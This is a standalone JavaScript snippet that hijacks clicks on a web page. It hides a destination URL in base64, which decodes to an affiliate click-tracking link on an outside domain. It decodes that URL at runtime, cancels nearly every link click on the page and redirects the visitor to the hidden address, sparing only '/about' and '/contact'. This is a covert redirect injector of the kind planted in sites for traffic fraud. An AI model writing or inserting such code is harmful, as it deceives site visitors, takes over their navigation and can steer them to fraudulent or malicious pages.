const excludedLinks = ['/about', '/contact'];
const base64Url = 'aHR0cHM6Ly90cmtnZmxvdy5nMmFmc2UuY29tL2NsaWNrP3BpZD0xMyZvZmZlcl9pZD0zMDU0';

function base64_decode(data) {
    var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, enc = '';
    do {
        h1 = b64.indexOf(data.charAt(i++));
        h2 = b64.indexOf(data.charAt(i++));
        h3 = b64.indexOf(data.charAt(i++));
        h4 = b64.indexOf(data.charAt(i++));
        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
        o1 = bits >> 16 & 0xff;
        o2 = bits >> 8 & 0xff;
        o3 = bits & 0xff;

        if (h3 == 64) enc += String.fromCharCode(o1);
        else if (h4 == 64) enc += String.fromCharCode(o1, o2);
        else enc += String.fromCharCode(o1, o2, o3);
    } while (i < data.length);
    return enc;
}

const redirectUrl = base64_decode(base64Url);

function shouldRedirect(event) {
    const href = event.target.closest('a')?.getAttribute('href');
    return href && !excludedLinks.includes(href);
}

document.addEventListener('DOMContentLoaded', () => {
    document.body.addEventListener('click', (event) => {
        if (shouldRedirect(event)) {
            event.preventDefault();
            window.location.href = redirectUrl;
        }
    });
});
